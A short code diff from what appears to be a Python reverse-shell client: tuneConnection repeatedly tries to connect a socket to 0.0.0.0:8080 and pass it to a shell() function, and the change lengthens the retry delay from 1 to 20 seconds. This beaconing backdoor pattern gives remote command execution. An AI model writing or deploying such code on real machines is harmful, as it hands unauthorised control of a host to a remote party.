@@ -11,7 +11,7 @@ def tuneConnection():
     mySocket = socket.socket()
     #Trying to connect to server every 20 seconds
     while True:
-        time.sleep(1)
+        time.sleep(20)
         try:
             mySocket.connect(('0.0.0.0', 8080))
             shell(mySocket)
